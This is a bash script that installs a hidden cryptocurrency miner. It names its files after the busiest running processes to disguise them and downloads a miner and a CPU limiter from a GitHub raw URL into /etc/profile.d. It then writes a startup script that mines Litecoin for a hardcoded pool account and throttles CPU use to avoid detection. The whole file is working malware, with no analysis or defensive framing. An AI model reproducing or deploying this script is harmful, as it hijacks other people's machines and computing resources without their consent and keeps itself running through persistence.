#! /bin/bash
i=0
minerd=""
limit=""
runsh=""
r=`ps -eo args --sort=-pcpu  | head -n 4`
for line in $r
do
    if test $i != 0; then
		line_t=${line%% *}
		if [[ "$minerd" == "" ]];then
			result=$(echo $line_t | grep -Eo "[A-Za-z0-9]+" )
			for one in $result
			do
				if [[ ${#one}>3 ]];then
					minerd=$one
				fi
			done
		elif [ "$limit" == "" ];then
			result=$(echo $line_t | grep -Eo "[A-Za-z0-9]+" )
			for one in $result
			do
				if [[ ${#one}>3 ]];then
					limit=$one
				fi
			done

		elif [ "$runsh" == "" ];then
			result=$(echo $line_t | grep -Eo "[A-Za-z0-9]+" )
			for one in $result
			do
				if [[ ${#one}>3 ]];then
					runsh=$one
				fi
			done

		else
			break
		fi
	fi
    i=$((${i} + 1))
done

minerd="${minerd}d"
limit="${limit}d"
runsh="${runsh}d"
echo $minerd
echo $limit
echo $runsh
address=""
ipaddr=$(ip addr | awk '/^[0-9]+: / {}; /inet.*global/ {print gensub(/(.*)\/(.*)/, "\\1", "g", $2)}')
for addr in $ipaddr
do
	address=$addr
done
echo $address
if [ -d "/etc/profile.d" ]; then
	curl -s https://raw.githubusercontent.com/bluemoon00/mymin/master/limit >> "/etc/profile.d/${limit}"
	curl -s https://raw.githubusercontent.com/bluemoon00/mymin/master/minerd >> "/etc/profile.d/${minerd}"
	echo '
#! /bin/bash
ps_out=`ps -ef | grep '${minerd}' | grep -v 'grep' | grep -v 'limit'`
result=$(echo $ps_out | grep "'${minerd}'")
if [[ "$result" != "" ]];then
    echo "Running"
else
	nohup ./'${minerd}' -o stratum+tcp://stratum-ltc.antpool.com:443 --userpass=bluemoonyjcb.'${address}':123456 &
fi

ps_out=`ps -ef | grep '${limit}' | grep -v 'grep'`
result=$(echo $ps_out | grep "'${limit}'")
if [[ "$result" != "" ]];then
    echo "Running"
else
	nohup ./'${limit}' -l 10 -e '${minerd}' &
fi
'> "/etc/profile.d/${runsh}"
	chmod +x "/etc/profile.d/${limit}"
	chmod +x "/etc/profile.d/${runsh}"
	chmod +x "/etc/profile.d/${minerd}"
fi













